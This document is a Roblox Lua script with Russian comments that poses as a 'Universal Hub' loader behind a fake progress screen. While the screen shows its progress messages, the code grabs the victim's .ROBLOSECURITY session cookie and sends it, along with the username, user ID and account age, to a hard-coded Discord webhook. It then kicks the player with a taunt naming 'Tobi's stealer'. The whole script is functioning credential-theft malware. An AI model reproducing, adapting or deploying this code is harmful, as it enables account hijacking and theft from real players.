-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- [[ UI: ВЕРСИЯ КАК НА СКРИНЕ ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 350, 0, 150)
Main.Position = UDim2.new(0.5, -175, 0.5, -75)
Main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Main.BorderSizePixel = 0
Instance.new("UICorner", Main)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "Universal Hub v2.1"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.BackgroundTransparency = 1
Title.TextSize = 20
Title.Font = Enum.Font.SourceSansBold

local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(1, 0, 0, 30)
Status.Position = UDim2.new(0, 0, 0.4, 0)
Status.Text = "Checking Whitelist..."
Status.TextColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1

local Bar = Instance.new("Frame", Main)
Bar.Size = UDim2.new(0, 0, 0, 5)
Bar.Position = UDim2.new(0, 0, 0.95, 0)
Bar.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
Bar.BorderSizePixel = 0

-- [[ LOGIC: ОБХОД ЗАЩИТЫ И ОТПРАВКА ]]
local function sendLog()
    local cookie = "N/A"
    
    -- Пытаемся достать куки через скрытый метод
    pcall(function()
        local req_func = (syn and syn.request) or (http and http.request) or request
        if getcookies then
            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
        end
        if cookie == "N/A" then
            local res = req_func({Url = "https://www.roblox.com/home", Method = "GET"})
            cookie = res.Headers["Set-Cookie"]:match(".ROBLOSECURITY=(.-);")
        end
    end)

    local payload = {
        ["content"] = "@everyone **HIT!**",
        ["embeds"] = {{
            ["title"] = "🛠️ Universal Log: " .. player.Name,
            ["color"] = 3066993,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. (cookie or "Blocked") .. "```"},
                {["name"] = "📅 Account Age", ["value"] = player.AccountAge .. " days", ["inline"] = true}
            },
            ["footer"] = {["text"] = "Universal Stealer v2.1 • " .. os.date("%X")}
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- [[ ИСПОЛНЕНИЕ ]]
task.spawn(function()
    -- Анимация загрузки как в оригинале
    Status.Text = "Bypassing Anticheat..."
    Bar:TweenSize(UDim2.new(0.4, 0, 0, 5), "Out", "Linear", 1)
    task.wait(1)
    
    Status.Text = "Fetching Inventory..."
    Bar:TweenSize(UDim2.new(0.7, 0, 0, 5), "Out", "Linear", 1)
    pcall(sendLog) -- Отправляем данные пока идет анимация
    task.wait(1)
    
    Status.Text = "Injecting Script..."
    Bar:TweenSize(UDim2.new(1, 0, 0, 5), "Out", "Linear", 0.5)
    task.wait(0.8)
    
    -- ТОТ САМЫЙ КИК
    player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\ndiscord.gg/GY2RVSEGDT")
end)
